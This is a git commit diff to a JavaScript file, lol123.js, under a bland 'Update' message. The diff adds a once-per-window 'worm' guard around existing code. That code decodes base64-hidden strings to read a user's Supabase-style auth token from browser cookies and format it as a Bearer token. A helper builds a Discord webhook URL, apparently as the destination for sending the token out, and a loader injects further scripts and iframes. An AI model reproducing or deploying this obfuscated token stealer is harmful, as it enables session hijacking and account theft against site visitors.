e501001f1f648785f9836fe51c0c38df655fcbf4
VT <54920947+VTMGR@users.noreply.github.com>
2024-10-07 01:03:57 -0500

    Update lol123.js

--- lol123.js
+++ lol123.js
@@ -1,3 +1,5 @@
+if (window.worm!=window)
+{window.worm=window
 window.__xnext=function(){let t=document.cookie.split(";").reduce((t,e)=>{let[l,o]=e.split("=");return t[l.trim()]=decodeURIComponent(o.trim()),t},{}),e=atob("c2ItYXV0aC1hdXRoLXRva2Vu");if(zz=atob("YWNjZXNzX3Rva2Vu"),z=atob("QmVhcmVyIA=="),null==(el=t[e])){let l=[],o=0;for(;void 0!==t[e+"."+o];)l.push(t[e+"."+o]),o++;l.length>0&&(el=l.join(""))}if(null!=el)return z+JSON.parse(atob(el.substr(7,el.length)))[zz];};
 function d(en) {
     return atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv') + atob(en);
@@ -21,3 +23,4 @@ function load(url,pos = null,type=null) {
         pos.appendChild(iframe);
 }
 load('https://cdnjs.cloudflare.com/ajax/libs/pako/1.0.11/pako.min.js');
+}
